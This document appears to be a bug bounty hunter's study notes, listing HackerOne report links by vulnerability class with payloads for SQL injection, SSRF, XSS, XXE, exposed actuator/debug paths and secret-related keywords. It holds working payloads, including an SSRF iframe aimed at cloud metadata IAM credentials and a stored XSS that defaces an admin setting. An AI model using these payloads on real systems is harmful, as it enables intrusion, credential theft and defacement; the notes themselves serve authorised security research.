https://hackerone.com/reports/796956
https://hackerone.com/reports/791775
Web 3 isssues:
https://hackerone.com/reports/1651429
https://hackerone.com/reports/1710564
https://hackerone.com/reports/502207
Android:
https://hackerone.com/reports/1343300
https://hackerone.com/reports/1500614
https://hackerone.com/reports/1372667
https://hackerone.com/reports/1122177
https://hackerone.com/reports/532225
HTTP Request smuggling:
https://hackerone.com/reports/1524555 
https://hackerone.com/reports/1524692
https://hackerone.com/reports/1501679
https://hackerone.com/reports/1063627
https://hackerone.com/reports/1063493
```

## SQL Injection

```
Payload
Category
Blind SQLi in Rest API Path
id parameter
https://hackerone.com/reports/2051931
/api/path/to/id_endpoint/1/999%20or%201=2—
Blind SQLi
Boolean Based
SQLi at search text paramemter
search
https://hackerone.com/reports/2073717
')AND+22=22+AND+('NaXY'+LIKE+'NaXY
Boolean Based
SQLi at id parameter
id parameter
https://hackerone.com/reports/1506129
1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)
Blind SQLi
Time Based
Blind SQLi 
rest api
https://hackerone.com/reports/2020429
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
Blind SQLi
Time Based
SQLi that probably use LIKE
https://hackerone.com/reports/1628408
SQLi
https://hackerone.com/reports/1489744
AA'+OR(cast(version as date))LIKE'A
Boolean Based
Blind SQLi at id parameter
id parameter
https://hackerone.com/reports/838855
-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
SQLi on lang cookie
lang
https://hackerone.com/reports/761304
%2b(select*from(select(sleep(20)))a)%2b
General Takeaways:
SQLmap command:
> Loading JavaScript code…
​
```

## SSRF

```
SSRF via Analytics Reports
PDF Generation
https://hackerone.com/reports/2262382
Always check PDF generators for SSRF
Blind SSRF to Internal Network Enumeration
Integration
https://hackerone.com/reports/1832494
Full Read SSRF via webhook feature 
Webhook
https://hackerone.com/reports/2123113
SSRF can also be used to trigger XSS
Full Read SSRF to XSS
fetch image
https://hackerone.com/reports/2106708
SSRF to XSS
SSRF via source parameter
app feature
https://hackerone.com/reports/1864188
SSRF to XSS
render feature
https://hackerone.com/reports/1853061
Partial Read SSRF
chat link preview
https://hackerone.com/reports/1960765
internal services enumeration
Blind SSRF to port scanning
smtp host
https://hackerone.com/reports/1746582
https://hackerone.com/reports/1741525
SSRF bypass using advanced alphanumeric ips
https://hackerone.com/reports/1702864
Access forbidden subdomains by replacing host headers
host header
https://hackerone.com/reports/1783015
always try accessing forbidden subdomains via host header replacement
Full read ssrf via url download
download
https://hackerone.com/reports/1624140
SSRF via pdf generator
PDF Generation
https://hackerone.com/reports/1628209
</script><script>document.write('<iframe src=\"http://███/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\" width=1000px height=1000px>')</script>
SSRF via base64 encoded url
url
https://hackerone.com/reports/1189367
SSRF to aws file read
url
https://hackerone.com/reports/978823
Host header based blind ssrf to internal port scan
host header
https://hackerone.com/reports/727330
https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
SSRF to local file read via vulnerable video upload feature with ffmpeg to process videos
video upload
https://hackerone.com/reports/1062888
add this to your video upload feature methodology: https://hackerone.com/reports/1062888
SSRF via chatbot and ssti
chatbot
https://hackerone.com/reports/1108418
SSRF to send email confirming the vuln even if the page results with 404
fetch image
https://hackerone.com/reports/811136
always check gopher://test.smtp.org:25
SSRF to steal google metadata
fetch image
https://hackerone.com/reports/530974
read again later
Full Read SSRF on internal grafana chained with openredirects
https://hackerone.com/reports/878779
Full Read SSRF to RCE
https://hackerone.com/reports/341876
read again later
Table
```

## SSTI

```
SSTI in first name while signup using {{7*7}}:  https://hackerone.com/reports/1104349
```

## Sensitive Paths

```
/Administration/Administration.aspx
/secure/QueryComponent!Default.jspa endpoint
/debug.log
/+CSCOE+/saml/sp/acs?tgname=a
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
/site
/pim/flower/
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo
/pages/createpage-entervariables.action?SpaceKey=x
/confluence/pages/doenterpagevariables.action
/pentaho
/+CSCOE+/session_password.html
/fxa-rp-events
/app/tmp/healthcheck.json
/rest/menu/latest/admin?maxResults=1000
/grafana/logs/
/cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa
:1024/haproxy-status
/mw-config/index.php
/debug
/config.json
/api/getEnvVars
/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
/splunkd/__raw/services/server/info/server-info?output_mode=json
/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
?url=https://your_api_spec/spec.yaml
?configUrl=https://your_api_spec/file.json
/database.php.orig
/old/wp-admin/setup-config.php
/wp-admin/setup-config.php
/debug/pprof/
/debug/pprof/cmdline?debug=1
/actuator/beans
/actuator/caches
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/mappings
/actuator/
/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/hostname
/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
/info
/WEB-INF/
/META-INF/
/_vti_bin/spdisco.aspx
/heapdump
/env
```

## Template Injection

```
Client Side template Injection to XSS
Search
name
https://hackerone.com/reports/1736317
https://hackerone.com/reports/587829
payload:
> Loading JavaScript code…
​
```

## Unauthenticated access to sensitive endpoint

```
unauthenticated access to sensitive endpoints
Unauthenticated Access to admin only endpoints
forget password
https://hackerone.com/reports/2043552
Grafana logs exposed - unauthenticated
grafana logs
https://hackerone.com/reports/1948562
HAProxy stats panel exposed
HAProxy
https://hackerone.com/reports/1884372
Cortex API unauthenticated
https://hackerone.com/reports/1258871
```

## Web 3

```
Reentrancy
```

## XSS - DOM Based

```
DOM XSS
JS sink
payload
DOM XSS to Account takeover
document.write()
https://hackerone.com/reports/1619445
DOM XSS via hack_redirect_now parameter
https://hackerone.com/reports/2007093
DOM XSS 
https://hackerone.com/reports/1452149
');alert(1);//
DOM XSS though ads
document.write()
https://hackerone.com/reports/889041
'-alert(document.domain)-'
```

## XSS - Reflected

```
Comments
Totobarjo
03/31/2024
Test
Reflected XSS
XSS at login redirect_uri
javascript:alert(document.domain)
https://hackerone.com/reports/2055132
https://hackerone.com/reports/1167272
https://hackerone.com/reports/1502099
Login
redirect_uri
XSS in post parameter via CSRF
“><script>alert(1)</script>
https://hackerone.com/reports/2050122
https://hackerone.com/reports/1096123
https://hackerone.com/reports/2037234
https://hackerone.com/reports/1183241
forget password
XSS
CSRF
Text Injection via utm_source & utm_medium
“> text
https://hackerone.com/reports/2234420
utm_source
utm_medium
XSS at user unsubscribe parameter
%27%22%3E%3C/title%3E%3Cscript%3Ealert(xss)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E
https://hackerone.com/reports/1913263
unsubscribe
Reflected XSS in username parameter
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
https://hackerone.com/reports/1363001
username parameter
Reflected XSS via not found page
%22%20onmouseover=%22prompt(1)%22%20x=%22
https://hackerone.com/reports/1892317
404 not found page
XSS via post parameter (no CSRF)
<script>alert(1)</script>
https://hackerone.com/reports/2051085
date parameter
RXSS via SSRF
https://hackerone.com/reports/2035332
https://hackerone.com/reports/1853061
url parameter
render url rest path
XSS
SSRF
XSS at login page 
%22onpointermove%3Dprompt%281%29+class%3Dss11+
Login
XSS using svg use tag
<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEzMzcnIGhlaWdodD0nMTMzNyc+CjxpbWFnZSBocmVmPSIxIiBvbmVycm9yPSJhbGVydCh3aW5kb3cub3JpZ2luKSIgLz4KPC9zdmc+#x\"/></svg>
https://hackerone.com/reports/1694173
XSS in browser to bypass CSP
<meta name="author" content="Evil <script nonce=%READER-TITLE-NONCE%>alert(document.location);</script>!--">
https://hackerone.com/reports/1436142
browser
XSS on Brave Today through custom RSS feed
<entry>
  <title>XSS</title>
  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
  <content type="html"><![CDATA[<img src="https://csrf.jp/test.png">]]></content>
</entry>
https://hackerone.com/reports/1184379
browser
XSS on exposed cpanel endpoint  (CVE-2023-29489)
/cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa
https://hackerone.com/reports/1982630
cpanel
XSS via redirect parameter
javascript:alert()
https://hackerone.com/reports/1962645
https://hackerone.com/reports/1962951
XSS via get based form parameters
https://hackerone.com/reports/1420529
Clickjacking
XSS
XSS
%3CHTMl%0Aonmouseover%0A=%0Aalert(%27XSSSuccess!%27)%0Dx//
https://hackerone.com/reports/1882751
Reflected XSS and waf bypass
0xd3adc0de%26lt;ScRiPt%26gt;alert(%27XSS%20Success!%27)%26lt;/sCripT%26gt;
https://hackerone.com/reports/1873655
Reflected XSS via parameter in logout
javascript:(alert(%27XSS%20Success!%27))()
https://hackerone.com/reports/1882592
Reflected XSS in search field
%22%20%2C%20internalSearchTerm%3A%20%5B7%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b
https://hackerone.com/reports/1818163
XSS coz adding &random=parameter appends a random hidden input with name random
https://hackerone.com/reports/1322322
search field
Reflected XSS via verify email via url path
asd',%20alert(document.location),%20%27
https://hackerone.com/reports/1051373
Reflected XSS using parameter pollution
https://hackerone.com/reports/1632119
parameter pollution
XSS
Payload
Chains
XSS payloads:
​
General takeaways:
Try HTML encoding to check if we can bypass waf
Always try adding &random=parameter to get request to see how’s it being handled
Learn more about post message based xss: https://hackerone.com/reports/1081167
```

## XSS - Stored

```
Stored XSS
XSS at payment receipt
https://hackerone.com/reports/2078490
payment receipt
<svg on onload=(alert)(document.domain)>
XSS at embed url
https://hackerone.com/reports/1887917
embed url
javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//
XSS at parameter name
https://hackerone.com/reports/1940788
https://hackerone.com/reports/1647248
name field
<img src=x onerror=alert(/Stored_XSS/)>
XSS at tags
https://hackerone.com/reports/2031855
tags
#VLE#nothing#[<script>ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {'bypassRedirect':true, 'method': 'POST', 'data': {'csrfKey': key, 'site_online_checkbox':1, 'board_name': 'You have been hacked', 'form_submitted': 1}}))</script>]#!##.
XSS in user email field
https://hackerone.com/reports/2089042
https://hackerone.com/reports/1107726
email field
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
XSS via cookie
https://hackerone.com/reports/2010530
cookie
XSS via post
https://hackerone.com/reports/2012636
https://hackerone.com/reports/1987172
post
"style="position:fixed;top:0;left:0;border:999em solid green;" onmouseover="alert(document.cookie)”
Stored XSS at merge request pages
https://hackerone.com/reports/723307
name field
<img/src='x'/onerror=alert(document.domain)>
Stored XSS with CSP bypass
https://hackerone.com/reports/1731349
Stored XSS via button tag
https://hackerone.com/reports/1823216
https://hackerone.com/reports/1804177
<Button href="javascript://%0aalert(document.domain)">XSS</Button>
Stored XSS via file upload using filename with xss payload
https://hackerone.com/reports/1639919
file upload
Stored XSS in markdown rich text parser
https://hackerone.com/reports/1930763
markdown renderer
Stored XSS via color parameter
https://hackerone.com/reports/1693150
https://hackerone.com/reports/1665658
color parameter
">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>
Stored XSS
https://hackerone.com/reports/1842822
Stored XSS in rich text parser using this payload
https://hackerone.com/reports/1276742
rich text parser
Stored XSS via last name
https://hackerone.com/reports/1652046
user setting
Stored xss in rich text editor
https://hackerone.com/reports/1147433
rich text parser
">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
XSS via comments RSS
https://hackerone.com/reports/1664914
rss
<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(document.domain)</a:script>
Stored XSS via link
https://hackerone.com/reports/1698652
link
javascript://https://amazon.com/shop/x%0Aeval(\"(async()=>{await+fetch('https://linktr.ee/api/token').then((response)=response.json()).then((responseJson)=>{alert(responseJson['accessToken>']);})})()\")
Blind XSS
https://hackerone.com/reports/1558010
'"><img src=x id=█████ onerror=eval(atob(this.id))>
Blind XSS in internal jira
https://hackerone.com/reports/1369674
jira instance
support ticket
Stored XSS via pdf viewer
https://hackerone.com/reports/881557
pdf viewer
Stored XSS with payload html encoded
https://hackerone.com/reports/1425882
Stored XSS
https://hackerone.com/reports/1342009
<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
Stored XSS with CSP bypass
https://hackerone.com/reports/1212067
jsonp endpoint for csp bypass https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout
Stored XSS in custom emoji via url
https://hackerone.com/reports/1198517
http://aaa#'><img onerror=alert(location) src=.>
XSS with CSP bypass coz iframe is allowed with *.firebaseapp.com whitelisted
https://hackerone.com/reports/1166766
Stored XSS with encoded emoji
https://hackerone.com/reports/853637
%F0%9F%98%82<%3CsVg/onload%F0%9F%98%82=/svg/onload%3Dsvg/onmouseOver=confirm1><!--%F0%9F%98%82//=
H1 Reports
Payload
General Takeaways:
if XSS exists in cookie, try to find a way to set that cookie value; in this report: https://hackerone.com/reports/2010530 a url parameter helped us to set cookie named yelpmainpaastacanary
usually cookie: a=1; b=2; creates 2 cookies and cookie: a =1 b=2; should create 1 cookie with a = 1 b=2 but yelp had this misconfiguration which allowed him to set 2 cookies via url.
always check how’s your input being passed and where it is rendered - keep a list whenever necessary - you might end up discovering a stored xss.
Payloads:
Rich text parser:
> Loading JavaScript code…
​
> Loading JavaScript code…
​
> Loading JavaScript code…
​
```

## XXE

```
Full read XXE on spellcheck endpoint
https://hackerone.com/reports/715949
XEE via jpeg file upload
https://hackerone.com/reports/836877
Paylaods:
​
```

## sensitive keywords

```
Authorization Basic
—token
gh_token
s3 amazonaws.com
```
